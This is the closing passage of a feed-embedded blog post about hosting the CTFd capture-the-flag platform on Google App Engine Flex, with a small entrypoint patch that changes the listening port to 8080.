&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now, we can serve challenge files via CTFd from a Cloud Storage Bucket without having to make the bucket public!&lt;&#x2F;p&gt;
&lt;p&gt;Lastly, one small thing with CTFd v3.4.1 is that it did not support configuring the port it runs on. App Engine Flex requires the applications to listen on port 8080, but CTFd listens on port 8000. We had to apply the following patch to circumvent this problem (thanks to the folks at DownUnderCTF for &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;DownUnderCTF&#x2F;ctfd-appengine&#x2F;blob&#x2F;master&#x2F;patch.txt&quot;&gt;this&lt;&#x2F;a&gt;:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#181818;color:#c4c4c4;&quot;&gt;&lt;code&gt;&lt;span&gt;diff -ruN original&#x2F;docker-entrypoint.sh changes&#x2F;docker-entrypoint.sh
&lt;&#x2F;span&gt;&lt;span&gt;--- original&#x2F;docker-entrypoint.sh
&lt;&#x2F;span&gt;&lt;span&gt;+++ changes&#x2F;docker-entrypoint.sh
&lt;&#x2F;span&gt;&lt;span&gt;@@ -5,6 +5,8 @@
&lt;&#x2F;span&gt;&lt;span&gt; WORKER_CLASS=${WORKER_CLASS:-gevent}
&lt;&#x2F;span&gt;&lt;span&gt; ACCESS_LOG=${ACCESS_LOG:--}
&lt;&#x2F;span&gt;&lt;span&gt; ERROR_LOG=${ERROR_LOG:--}
&lt;&#x2F;span&gt;&lt;span&gt;+WORKER_TIMEOUT=${WORKER_TIMEOUT:-60}
&lt;&#x2F;span&gt;&lt;span&gt;+WORKER_PORT=${WORKER_PORT:-8080}
&lt;&#x2F;span&gt;&lt;span&gt; WORKER_TEMP_DIR=${WORKER_TEMP_DIR:-&#x2F;dev&#x2F;shm}
&lt;&#x2F;span&gt;&lt;span&gt; SECRET_KEY=${SECRET_KEY:-}
&lt;&#x2F;span&gt;&lt;span&gt; DATABASE_URL=${DATABASE_URL:-}
&lt;&#x2F;span&gt;&lt;span&gt;@@ -42,8 +44,9 @@
&lt;&#x2F;span&gt;&lt;span&gt; # Start CTFd
&lt;&#x2F;span&gt;&lt;span&gt; echo &amp;quot;Starting CTFd&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt; exec gunicorn &amp;#39;CTFd:create_app()&amp;#39; \
&lt;&#x2F;span&gt;&lt;span&gt;-    --bind &amp;#39;0.0.0.0:8000&amp;#39; \
&lt;&#x2F;span&gt;&lt;span&gt;+    --bind &amp;quot;0.0.0.0:$WORKER_PORT&amp;quot; \
&lt;&#x2F;span&gt;&lt;span&gt;     --workers $WORKERS \
&lt;&#x2F;span&gt;&lt;span&gt;+    --timeout $WORKER_TIMEOUT \
&lt;&#x2F;span&gt;&lt;span&gt;     --worker-tmp-dir &amp;quot;$WORKER_TEMP_DIR&amp;quot; \
&lt;&#x2F;span&gt;&lt;span&gt;     --worker-class &amp;quot;$WORKER_CLASS&amp;quot; \
&lt;&#x2F;span&gt;&lt;span&gt;     --access-logfile &amp;quot;$ACCESS_LOG&amp;quot; \
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;For details on how this integrated to our Terraform deployment and the CTFd Dockerfile, see the repository linked above. &lt;&#x2F;p&gt;
&lt;p&gt;Since this post became so long, Kubernetes and the challenge cluster will be described in another post.&lt;&#x2F;p&gt;
</content>
	</entry>
</feed>
